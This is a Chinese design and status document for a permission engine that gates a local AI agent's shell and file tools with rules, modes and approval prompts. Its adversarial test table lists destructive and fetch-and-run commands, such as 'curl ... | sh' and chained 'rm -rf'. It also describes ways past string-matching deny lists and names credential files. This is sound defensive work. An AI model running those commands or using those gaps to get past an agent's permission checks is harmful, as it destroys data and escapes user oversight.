# local-agent 权限管理方案（大纲 · 待评审）

> 状态：**大纲 + 已实现**（2026-09-17）。第一节的六个决策点已按倾向拍板并落地，见下方「实施状态」。
> 基线：`develop-2.0`（当前分支）。取向：完整规则引擎（allow / ask / deny 三层 + 会话模式 + 授权持久化）。
> 与 `feature/permission-management` 分支上那套旧方案的关系：**重新设计，但吸收其已踩过的坑**（见第八节）。

---

## 实施状态（2026-09-17）

**已完成**：P0（引擎核心 + 拦截点装饰）、P1（询问回路 + 前端授权弹窗）、P2（三层规则配置 + 命令分解 + 只读白名单）、P3 的大部分（模式联动 + 失效 UI 收口为真实现）。

### 后续增量：文件六件套与路径判定（同日）

在权限引擎落地后补上了 Claude Code 风格的**文件工具**：`read_file` / `write_file` / `edit_file` / `glob` / `grep` / `list_dir`。这一步是为了让权限判定的主体从「命令字符串」升格为「工具 + 路径」——原先所有文件操作都挤过 `exec_shell`，判定只能靠命令拆解与正则。

- **判定主体新增 `SubjectKind = path`**（`permission.go`）：读操作走只读放行，写操作按模式判定。`manual` 询问、`auto` 放行项目内写、`plan` 直接拒绝、**`acceptEdits` 终于生效**（项目内写自动放行，这正是该模式存在的意义）。敏感路径（`.env`、私钥）排在第 7 步，所以 acceptEdits 下改 `.env` 仍会问。
- **暴露策略**：六个文件工具直出给模型，`tool_router` 继续兜底 MCP / 自定义 CLI / API 等长尾工具，避免 prompt 膨胀。两条路径（直调与经路由器）落到同一个 registry，因此都被网关拦住（有测试断言）。
- **路径边界**用 `pathWithinProject`：只认绝对路径、拒 `~`、拒 `..` 跳转、并正确处理公共前缀（`/home/me/proj-other` 不算项目内）。工作目录未知时一律不放行。
- **差异归因**：`write_file` / `edit_file` 记录 before/after，用 `git diff --no-index` 生成统一 diff（复用差异面板的 `ParseUnifiedDiff`），改动挂到对应 `ToolCall.Files` 上，工具卡片展开即可看到本次调用改了哪些文件；完整 hunks 经 `GetToolFileChanges` 提供给差异面板。
- **顺带修好一处历史行为**：`exec_shell` 的工作目录改为会话项目目录（原先继承进程 cwd），相对路径因此有了确定含义——这也是 `auto` 模式「项目内/外」判定的前提。
- **内置工具会补齐**：`ToolStore` 新增 `ensureBuiltins()`，老用户的 `tools.json` 里缺的新内置工具会在启动时自动追加并落盘。
- 系统提示词增加了「工具使用偏好」一段，引导模型用 `read_file`/`edit_file` 而不是 `cat`/`sed -i`——否则文件工具做出来了，模型仍走 shell，acceptEdits 的价值也就落空了。

### 六个决策点的落地

| # | 决策点 | 决定 |
|---|--------|------|
| 1 | 模式取值集合 | `manual / acceptEdits / plan / auto`，与前端 UI 一致；**不做 `bypassPermissions`** |
| 2 | `auto` 语义 | 按**作用域**定义：仅项目目录内的本地写操作自动放行；出网 / 包管理 / 解释器 / 提权 / 删除类 / 越界路径 / 上级跳转一律询问。依据是「没有安全分类器，只能判断碰得到哪里，不能判断想干什么」 |
| 3 | 询问回路 | 路线 A：同一 chat 调用内阻塞等待，超时 5 分钟，会话级取消，**没有可应答界面时立即拒绝**（不空等） |
| 4 | 规则存储 | 三层文件（用户全局 / 项目级 / 项目本地），会话授权仅内存；项目本地层未被 gitignore 时给出提示但不代改仓库 |
| 5 | 失效 UI | TopBar 权限下拉与设置页「权限配置」都换成真实现，不留过渡态 |
| 6 | 落地位置 | 直接在当前分支工作树（未新建分支） |

### 与大纲的三处有意偏离

1. **ctx 没有贯通到工具执行**。大纲把「`ExecuteTool` 接收 ctx」列为 P0 前置项；实现改为复用计划取消的既有范式：broker 自带超时 + `CancelPermissionWait(sessionID)` 会话级取消。理由是与 `planCancels` 一致、不扩散签名变更（`ExecuteTool` 有 14 处调用点，其中 12 处在测试里）。代价是「聊天整体取消」仍不可用——LLM 调用本身也不可取消，这一限制与改动前一致。
2. **统一装饰代替 5 处 wrapTool**。在 `BuildView` 末尾对 registry 做一次遍历包装（必须在 `NewMetaTool` 之前，因为路由器持有同一个 map），新增工具类型不可能漏判。`tool_router` 自身不装饰：它只做发现与分发，装饰它会让同一次调用被判两遍、弹两次窗。
3. **`SubjectMeta` 分支在当前装配下不可达**。因为路由器没被装饰，`list` / `describe` 根本不会进入判定；该分支保留为防御性代码（若将来改为装饰路由器，元数据语义即可生效）。因此「只读元数据不产生审计噪音」是靠装配结构实现的，而不是靠管线分支。

### 已知限制（明确不承诺的部分）

- **没有沙箱**。deny 名单再全也只是字符串与正则匹配，`bash -c` 的逃逸面（变量展开、脚本文件间接执行、`eval`）无法穷尽。本方案减少误伤与误放，**不承诺绝对安全**。
- **Windows 上只读白名单实际失效**。判定按 POSIX 语义写（`\` 视为转义、`;`/`&&` 为分隔符），在 PowerShell 下会因保守规则全部落到「询问」——方向安全，但会变吵。
- ~~`acceptEdits` 与 `manual` 等价~~：**已解决**——文件工具落地后，acceptEdits 对「项目内的文件写操作」自动放行（命令仍逐条询问）。若模型仍用 `exec_shell` 改文件（`sed -i` 等），那些操作照旧询问。
- **只读命令可以读项目外的文件**（如 `ls /etc/passwd`）。读取不改变状态，故沿用只读默认放行；`.env`、私钥、`.aws/credentials` 等敏感路径由 sensitive 名单强制询问。
- **`exec_shell` 的工作目录改为会话项目目录**（原来继承进程 cwd）。这是 `auto` 模式「项目内/外」判定的前提，也让系统提示词里「相对路径相对于工作区」的说法成立；属于顺带的行为修正。

### 需要在本机完成的验证（沙箱内无法执行）

```bash
gofmt -l .            # 我无法运行 gofmt，列对齐是按规则手工核对 + 脚本校验的
go build ./... && go test ./...
cd frontend && npm run build
```

沙箱内已做的验证：Go 全部文件括号平衡（自建词法遍历）、新文件所有跨文件符号引用核对、struct/const 块列对齐规则校验、**把引擎的正则与判定逻辑从源码抽出在 Python 里复刻并逐条跑完测试期望**（命令分解 / 只读白名单 / 内置 deny / 敏感 / 方向性 / 模式共 60+ 用例全部一致）。前端：7 个 SFC 编译通过、4 个 JS 文件语法检查通过。

复刻验证抓出过一处真实分歧（命令替换单元的**顺序**与测试期望相反），已按「保持源码顺序」修正实现并同步测试——这正是它比纯静态检查有价值的地方。

### 实际改动的文件

新增：`permission.go`（决策/规则/分解/只读白名单/内置名单/管线/授权/审计）、`permission_config.go`（三层配置读写与合并）、`permission_app.go`（网关接口与装饰器、询问回路 broker、bound 方法与状态快照）、`permission_test.go`、**`filetools.go`（六个文件工具 + 路径解析 + 改动归因日志）**、`filetools_test.go`；前端 `api/permission.js`、`stores/permissions.js`、`components/business/PermissionDialog.vue`、`components/business/PermissionSettings.vue`。

修改：`toolstore.go`（新增 6 个内置工具配置 + `ensureBuiltins` 迁移）、`tools.go`（BuildOptions + 装配期统一装饰 + 工作目录 + 直出工具定义）、`toolruntime.go`（CLI/API 工具自报判定主体 + 工作目录）、`chat.go`（事件常量与 `permission_request` 事件、统一的 `emitChatEvent`、装配网关）、`app.go`（权限组件初始化、`baseDir` 字段、新建会话采用配置层默认模式）、`sessions.go`（模式归一化）、前端 `api/session.js`（事件分发）、`panes/ChatPane.vue`（弹窗挂载 + 工具卡片 pending 态 + 停止按钮取消等待）、`components/business/ToolCallCard.vue`（等待授权状态）、`components/business/ToolProcess.vue`（pending 计入进行中、摘要优先展示等待授权）、`views/Settings.vue`（权限面板换真实现）、`types/index.js`（模式语义定稿）、`wailsjs/go/{App.js,App.d.ts,models.ts}`（补齐绑定）。

---

## 一、这份大纲需要你拍板的六件事

展开成完整方案前，下面六个问题会显著改变设计形态，建议先定：

| # | 决策点 | 候选 | 我的倾向 |
|---|--------|------|----------|
| 1 | 模式取值集合 | `manual/acceptEdits/plan/auto`（当前分支 UI）vs `default/acceptEdits/plan/bypassPermissions`（旧方案引擎） | 以当前分支 UI 的四个为准，`bypassPermissions` 暂不做约束，见 §4.3 |
| 2 | `auto` 模式的语义 | 本项目**没有** AI 安全分类器，"后台安全检查"无从谈起 | 重定义为「仅项目目录内的写操作自动放行，越界一律询问」，见 §4.3 |
| 3 | 询问回路的形态 | A. 同一 chat 调用内阻塞等待 / B. 挂起 + 另起调用（复用计划审批范式） | B 更省事但语义更绕，倾向 A + 明确超时，见 §6 |
| 4 | 规则存哪、是否入库 | 项目内 `.local-agent/`（可能被误提交）vs 用户目录 | 三层分离，项目本地层默认 gitignore，见 §7 |
| 5 | 当前分支上那几个失效权限 UI | 保留 / 先隐藏 / 直接删 | 实现时由新引擎接管，不留过渡态 |
| 6 | 实现落在哪个分支 | `develop-2.0` / 新分支 | 新分支（工作树里还有未提交的 viewMode 等改动） |

---

## 二、目标与非目标

### 2.1 目标

1. `exec_shell` 这类能执行任意本机命令的工具，在**执行前**有一个可配置、可审计、可解释的判定环节。
2. 判定结果三态：放行 / 询问 / 拒绝。询问态能把问题送到用户面前并拿到答复。
3. 用户授权可记忆（本会话、项目级、全局），规则可分层覆盖。
4. 会话级权限模式，决定整体松紧。
5. 每一条决策都能回答「命中了哪条规则、规则来自哪个文件」。

### 2.2 非目标（本期不做）

- 沙箱 / 容器隔离（当前 `exec_shell` 直接 `bash -c`，见 `tools.go:47`）。
- PreToolUse / PostToolUse 之类的 hooks 机制。
- AI 安全分类器（因此 `auto` 模式必须重新定义，见 §4.3）。
- 网络访问控制、文件系统级 ACL。

---

## 三、现状盘点

### 3.1 拦截点在哪（已核实）

工具执行的调用链只有一条，且收口很干净：

```
LLM 只能看到 tool_router          tools.go:314  SessionView.GetToolsForLLM()   ← 只返回元工具
  └─ tool_router(action=execute)  tools.go:185  MetaTool.executeTool()
       └─ targetTool.Execute()    tools.go:206
  └─ 聊天循环的直接入口            chat.go:597  toolView.ExecuteTool(name, args)
       └─ tools.go:337  SessionView.ExecuteTool()
```

两个可插入拦截的位置：

- **装配期装饰**（推荐）：`tools.go:245` `ToolManager.BuildView()` 里共 5 处往 `registry` 写工具（内置 `exec_shell`、动态 CLI、动态 API、MCP 子工具、`read_skill`）。在此处把每个 `ToolInterface` 包一层网关，则 `tool_router` 拿到的是同一个 map，**路由器路径与直调路径一并覆盖**，不存在旁路。
- 调用期判定：改 `SessionView.ExecuteTool`。缺点是对 `tool_router` 需要特判解包，且 `ExecuteTool` 目前硬编码 `context.Background()`（见 §3.3），本身就该改。

### 3.2 tool_router 解包：本项目独有的约束

因为只把 `tool_router` 暴露给 LLM，权限判定的**主体不是** `tool_router` 本身，而是它内层要执行的目标：

- `action=list` / `describe` → 只读元数据，**不判定**（否则每次发现工具都弹窗）。
- `action=execute` → 判定主体 = `(tool_name, arguments)`。

这一条必须在网关里显式解包，否则会出现「所有工具都叫 tool_router，规则没法区分」的死局。

### 3.3 既有可复用能力

| 能力 | 位置 | 怎么用 |
|------|------|--------|
| 会话级工具白名单 | `sessions.go` `EnabledTools` / `EnabledSkills` | 先「白名单过滤」再「权限判定」，两级正交 |
| 前端事件通道 | `chat.go:590` `EventsEmit(a.ctx, "chat:event", ChatEvent{...})` | 询问请求复用同一条通道 |
| 事件分发 | `frontend/src/api/session.js` `chat()` 内 `EventsOn('chat:event')` | 加一个事件类型即可 |
| 可打断的长流程 | `app.go:577` `registerPlanCancel` + `chat.go:861` `checkCancel` 轮询 channel | 询问的取消语义照抄 |
| 异步审批范式 | `plan.go` `PlanAwaitingApproval` → 前端展示 → 用户确认后 `ExecutePlan` | 询问回路方案 B 的现成骨架 |
| 工具调用三态展示 | `ToolProcess.vue` / `ToolCallCard.vue` 的 running/success/error | 加一个 `pending`（等待授权）态 |
| 决策结果回填 | `chat.go:600-608` 工具错误以 `role=tool` 消息回填给 LLM | 拒绝结果直接走这条路，LLM 能感知并调整 |

### 3.4 关键缺口

1. **零权限判定**：除 `sessions.go` 自身的结构体/默认值/patch 外，Go 侧没有任何代码读取 `Session.PermissionMode`，工具执行链路完全不看它。当前分支上的权限 UI 是失效的。
2. **ctx 未贯通**：`SessionView.ExecuteTool` 与 `MetaTool.executeTool` 都用 `context.Background()`，超时与取消传不进来。若要"等待用户应答可被打断"，这是必须先改的前置项。
3. **事件协议无权限位**：`ChatEvent`（`chat.go:385`）现有字段为 toolCall / reply / error / diff / plan / turn / stepIndex，没有承载"请求授权"的位置。
4. **无配置层**：当前分支没有 `settings.go`，没有规则文件、没有分层合并。
5. **前端无授权弹窗**。

---

## 四、权限模型

### 4.1 三层规则

**deny（拒绝）> ask（询问）> allow（放行）**，模式与授权都在这个序之下。deny 不可被任何东西覆盖。

### 4.2 求值方向性——旧方案踩过的最大坑

同一份"命令段"候选列表，喂给收紧方向和放宽方向时，需要的**量词是相反的**：

- **收紧方向**（deny / ask）：**存在**一段命中 ⇒ 整条成立。
- **放宽方向**（allow / 会话授权）：必须**所有段**各自被覆盖 ⇒ 整条才成立。

旧方案把 allow 也写成「任一命中即放行」，于是授权过 `grep:*` 之后，`rm -rf /tmp/x && grep -n y file.go` 会因为 grep 段命中而整条放行——**静默**放行，不报错不告警。这是本方案要在一开始就用类型和测试钉死的地方：

- 放行与收紧走**不同函数**（`coversAll` vs `matchAny`），不允许共用。
- `Decision` 的**零值必须是 Ask**（fail closed）：结构体零值、解析失败、超时、无人应答，全都落到"询问"而不是"放行"。
- 表驱动单测里放对抗性用例（见附录 A）。

### 4.3 会话权限模式

模式只调节"默认松紧"，不能突破 deny。建议取值与当前前端 UI 对齐，避免又出现两套词汇表：

| 模式 | 语义 | 与旧方案的差异 |
|------|------|----------------|
| `manual` | 一切写操作与命令都需确认（只读白名单除外） | 旧方案叫 `default` |
| `acceptEdits` | 文件编辑类自动放行，命令仍需确认 | 同名 |
| `plan` | 只读探索，任何写操作直接拒绝 | 同名 |
| `auto` | **需重新定义**：本项目无安全分类器，建议「仅项目目录内的写操作自动放行，越界（项目外路径、网络、删除类）一律询问」 | 旧方案里 `auto` 不存在 |

`bypassPermissions` 建议**本期不做**——它等于把安全模型关掉，而当前 `exec_shell` 没有沙箱兜底，风险与收益不成比例。要做也应作为一个显式的、默认关闭、且在界面上持续提示的实验开关。

### 4.4 判定输入：归一化主体

引擎只认一个归一化结构，不认具体工具实现，这样新增工具类型不必改引擎：

```go
// 待定稿：主体 = 工具名 + 分类 + 待判定的"段"（命令段 / 路径 / URL）
type Subject struct {
    Tool  string      // 内层工具名（已解包 tool_router）
    Kind  SubjectKind // Command / Path / URL / Meta
    Units []Unit      // 一段一个单位：复合命令按 && || ; | 拆开
}
```

命令类需要**分解 + 替换检测**：`$(...)`、反引号、管道右侧、`;`/`&&` 串联都要拆成独立段分别判定，不能只匹配整行——旧方案的第二个漏洞就是整行判定用了前缀匹配，`git:*` 规则会把 `git status && rm -rf /tmp/x` 整条放行。

---

## 五、决策管线（骨架）

```
网关拦截 → 解包 tool_router → 归一化 Subject
   → 1. 会话工具白名单未通过？        → 拒绝（不询问，这是配置问题）
   → 2. 命中内置 deny（灾难性不可逆）？ → 拒绝，不可覆盖
   → 3. 只读白名单命中？              → 放行
   → 4. 项目/用户/本地规则求值        → deny / ask / allow
   → 5. 会话授权记录全覆盖？          → 放行
   → 6. 按会话模式决定默认松紧         → 放行 / 询问
   → 7. 询问：发事件 → 等应答 →（超时/无人应答 = 拒绝）
   → 8. 写审计：决策、命中规则、规则来源文件
```

要点：

- 第 1 步与第 2 步都是"不进询问回路"的硬判定，避免用弹窗掩盖配置错误。
- 第 7 步的失败方向必须是拒绝（fail closed）。
- 整条管线是**纯函数 + 一个副作用边界（询问与审计）**，纯函数部分可表驱动单测。

---

## 六、询问回路：两条路线

### 路线 A：同一 chat 调用内阻塞等待（倾向）

工具循环里发 `permission:request` 事件（扩展 `ChatEvent` 或新增事件名），然后阻塞等一个 channel；前端弹窗 → 调新的 bound 方法（如 `ResolvePermission(requestID, decision, scope)`）→ broker 唤醒阻塞。

- 需要：`ctx` 贯通改造（§3.4 第 2 条）、超时、以及"聊天被取消/窗口关闭"时的解除阻塞路径。
- 优点：时序直观，一次调用内闭环；前端已有的 `tool_call_start/end` 展示能自然插入 `pending` 态。
- 风险：后端阻塞期间若前端崩了，必须靠超时兜底，否则会挂死。

### 路线 B：挂起 + 另起调用（复用计划审批）

工具循环遇到需要授权时，**不阻塞**，直接以"待授权"状态结束本次调用并落盘；用户在前端确认后，前端再调一次执行入口继续。

- 优点：不需要 ctx 改造，完全复用 `PlanAwaitingApproval` → `ExecutePlan` 的既有骨架；后端无长阻塞。
- 代价：会话状态机复杂化（要能从中断处续跑），且"拒绝后让 LLM 感知并调整"这条回填路径要自己接。

**建议**：先做 A，因为它对 LLM 循环侵入小；若实现中阻塞带来的取消语义过于别扭，再退回 B（B 的骨架已经在计划模式里验证过）。

---

## 七、配置分层与存储

三层，后者覆盖前者（标量覆盖、列表合并）：

1. **用户全局**：`~/.local-agent/permissions.json`
2. **项目级**：`<项目>/.local-agent/permissions.json`（随仓库提交，团队共享）
3. **项目本地**：`<项目>/.local-agent/permissions.local.json`（**默认 gitignore**，个人临时放宽）

会话授权（"本会话允许"）**不落盘**，进程内保存，会话结束即失效——与旧方案一致。

规则语法沿用 Claude Code 的形状 `Tool(specifier)`，如 `exec_shell(git status:*)`、`Read(./src/**)`。具体语法在完整方案里定稿并配解析器单测。

---

## 八、从旧方案继承什么、推翻什么

### 8.1 继承（这些是花代价换来的）

1. **Fail closed 的类型级兜底**：`Decision` 零值 = Ask。
2. **deny 不可覆盖**，且与 ask 分层：灾难性不可逆操作进 deny；敏感路径（`.env`、私钥）进 ask，允许当场批准。"防误读"与"防破坏"是两回事。
3. **求值方向性**（§4.2）：`coversAll` 与 `matchAny` 分离。
4. **命令分解与替换检测**，以及整行判定只接受精确匹配、前缀规则只在逐段判定里生效。
5. **决策可解释**：每条决策带命中规则与来源文件。
6. **拒绝以工具错误回填**，复用既有 `role=tool` 路径，不改回填逻辑。
7. **只读命令白名单**这张清单本身（`ls`/`git status` 这类不该弹窗）。

### 8.2 推翻或调整

1. **规模**：旧方案 `permission.go` 1596 行 + `settings.go` 410 行 + `permission_app.go` 396 行 + 904 行测试，且**从未编译验证过**（沙箱无 Go 工具链）。新方案把"可验证性"当一等约束：每阶段可编译、可测、可手动验收，宁可少做功能也不留未验证的大块代码。
2. **模式词汇表不统一**：旧引擎用 `default/acceptEdits/plan/bypassPermissions`，当前前端用 `manual/acceptEdits/plan/auto`，两套并存正是合并时的静默故障源。新方案先冻结一套（§4.3）。
3. **模式存储位置**：旧方案把 `Session.PermissionMode` 字段删掉、改为运行时引擎持有且不落盘；当前分支是写进会话文件。新方案需要与刚实现的 `viewMode`（会话级、落盘）保持一致。
4. **文档即开发依据的写法**：旧文档 1039 行、含五处"与文档的有意偏离"章节。新方案不追求篇幅，追求"每一条断言都能被代码或测试指认"。

---

## 九、阶段划分与验收

每阶段结束都必须能编译、能跑测试、能手测。

**P0 前置改造 + 骨架**
ctx 贯通（`ExecuteTool` / `MetaTool.executeTool` 接收 ctx）；网关装饰器接入 `BuildView` 的 5 处 registry；`tool_router` 解包；`Decision` 零值 = Ask；纯函数判定骨架 + 表驱动单测。
*验收*：装配后 `tool_router` 内层调用全部经过网关（用单测断言无旁路）；对抗性用例 A1–A4 通过。

**P1 询问回路**
broker（请求/应答/超时/取消）；事件协议扩展；前端授权弹窗；工具卡片 `pending` 态；拒绝结果回填给 LLM。
*验收*：手测——触发询问 → 允许 / 拒绝 / 超时 三条路径都符合预期；拒绝后 LLM 能收到错误并改道。

**P2 规则与分层**
规则语法 + 解析器；三层配置合并；会话授权记忆；只读命令白名单；命令分解与替换检测。
*验收*：A5–A9 通过；前缀规则在放宽方向不生效。

**P3 模式与界面收口**
会话模式联动（含 `auto` 的新定义）；废弃当前分支上的失效 UI / 用真实现替换；设置页权限配置；审计视图。
*验收*：端到端手测四种模式；旧 UI 不再存在"存了不用"的状态。

---

## 十、风险与开放问题

1. **阻塞等待的取消语义**（§6）：聊天取消、窗口关闭、多请求并发时如何解除阻塞并保证不静默放行。
2. **`plan` 模式与本项目已有的"计划模式"重复**：输入框上已有单次意图的 plan 按钮（走 `ChatPlan`/`ExecutePlan`），权限下拉里的 `plan` 又是一个持久模式。两者语义要合并还是明确分工？
3. **`exec_shell` 无沙箱**：deny 名单再全也只是字符串匹配，`bash -c` 的逃逸面（变量展开、`eval`、脚本文件间接执行）无法穷尽。本方案能减少误伤与误放，**不承诺"绝对安全"**，这一点需要在文档里写死，避免给出虚假保证。
4. **规则文件被误提交**：项目本地层默认 gitignore，但项目级文件里的路径规则可能泄露内部目录结构，需在文档里提示。
5. **性能与 token**：每次工具调用都判定，`tool_router` 的 list/describe 必须短路，否则发现工具的成本会显著上升。
6. **与 `EnabledTools` 白名单的关系**：两者都"限制能用什么工具"，边界要在文档里画清楚（白名单 = 配置层面可见性；权限 = 执行层面授权）。

---

## 附录 A：对抗性用例清单（P0/P2 必须先写测试）

| # | 用例 | 期望 |
|---|------|------|
| A1 | 授权 `grep:*` 后执行 `rm -rf /tmp/x && grep -n y file.go` | **询问/拒绝**（放宽方向必须逐段全覆盖） |
| A2 | 规则 `git:*`（前缀）下执行 `git status && rm -rf /tmp/x` | **询问/拒绝**（前缀只在逐段判定生效） |
| A3 | 规则文件解析失败 / 字段非法 | **询问**（fail closed，不得放行） |
| A4 | 结构体零值 `Decision` | **Ask** |
| A5 | `curl -s http://example.com/x.sh \| sh` | 询问（管道右侧也是独立段） |
| A6 | `echo $(rm -rf /tmp/x)` | 命令替换被拆出并判定 |
| A7 | `cd /tmp && rm -rf ./*`（相对路径越界） | 按解析后的实际路径判定 |
| A8 | 询问超时 / 前端未应答 | 拒绝 |
| A9 | `tool_router(action=list)` | 放行，且不产生审计噪音 |

---

## 附录 B：改动文件清单（预估）

**新增**：`permission.go`（模型与判定，纯函数为主）、`permission_app.go`（bound 方法、broker、bound 装配）、`permission_test.go`、`docs/permission-management-plan-v2.md`（本大纲展开后的完整方案）。

**修改**：`tools.go`（网关装饰 + ctx 贯通 + 解包）、`toolruntime.go`（CLI/API/MCP 三类工具的 ctx 与主体归一化）、`chat.go`（事件协议扩展）、`app.go`（装配与 bound 方法注册）、`sessions.go`（模式字段按 §4.3 定稿）、`frontend/src/api/session.js`（事件分发）、`frontend/src/stores/`（权限状态）、`frontend/src/components/business/`（授权弹窗、工具卡片 pending 态）、`frontend/src/types/index.js`（模式取值定稿）。

**待定**：`settings.go`（是否引入独立配置层，取决于 §七 的存储方案）。
